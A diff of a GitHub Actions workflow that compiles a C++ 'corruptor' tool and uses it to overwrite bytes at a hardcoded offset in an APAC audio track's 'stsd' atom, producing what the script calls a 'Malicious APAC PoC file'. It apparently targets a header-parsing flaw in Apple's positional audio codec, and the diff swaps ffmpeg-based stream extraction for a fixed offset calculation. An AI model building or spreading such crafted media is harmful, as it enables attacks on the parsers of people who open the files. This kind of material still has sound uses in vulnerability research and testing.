@@ -114,41 +114,25 @@ jobs:
           clang++ -g corruptor.cpp -o corruptor
           if [ ! -f ./corruptor ]; then echo "C++ corruptor compilation failed."; exit 1; fi
 
-      # This is the main step that finds the APAC track, extracts it, and corrupts it.
-      - name: Extract and Surgically Corrupt APAC Track
+      # This is the main step that corrupts the file at a hardcoded, known-good offset.
+      - name: Surgically Corrupt APAC File
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
           set -x 
           
-          echo "Installing ffmpeg to identify the APAC stream..."
-          brew install ffmpeg
+          # Step 1: Create a copy of the new video file to corrupt.
+          cp IMG_1047.mov output_apac_poc.mp4
 
-          # Step 1: Use ffprobe to find the stream index for the 'apac' codec TAG.
-          APAC_STREAM_INDEX=$(ffprobe -v error -show_entries stream=index,codec_tag_string -select_streams a -of default=noprint_wrappers=1:nokey=1 IMG_1047.mov | grep 'apac' -B 1 | head -n 1)
-
-          if [ -z "$APAC_STREAM_INDEX" ]; then
-            echo "Could not find an APAC audio stream in the MOV file. Aborting."
-            exit 1
-          fi
-
-          echo "Found APAC audio in stream index: ${APAC_STREAM_INDEX}"
+          # Step 2: Use the manually identified offset for the APAC track's 'stsd' atom.
+          # This value (3461 in decimal is 0xd85 in hex) comes from your analysis of the atom_dump.json.
+          APAC_STSD_OFFSET=3461
           
-          # Step 2: Use ffmpeg to extract the raw APAC stream into a clean MP4 file container.
-          # The -map 0:[index] command selects the specific stream.
-          # The -c:a copy command performs a direct stream copy without re-encoding.
-          ffmpeg -i IMG_1047.mov -map 0:${APAC_STREAM_INDEX} -c:a copy output_apac_clean.mp4
+          # The channel layout tag is at a known position within the 'stsd' atom.
+          CORRUPTION_OFFSET=$(( ${APAC_STSD_OFFSET} + 72 ))
+          
+          echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"
 
-          if [ $? -ne 0 ]; then
-              echo "ffmpeg failed to create a clean APAC file."
-              exit 1
-          fi
-
-          echo "Successfully created a clean APAC file. Now corrupting it..."
-          cp output_apac_clean.mp4 output_apac_poc.mp4
-
-          # Step 3: Run the C++ utility to perform the corruption.
-          # For a clean file created with ffmpeg, the offset is much more predictable.
-          CORRUPTION_OFFSET=288 
+          # Step 3: Run the C++ utility to perform the corruption at the precise location.
           ./corruptor output_apac_poc.mp4 $CORRUPTION_OFFSET
           
           echo "Malicious APAC PoC file generated."
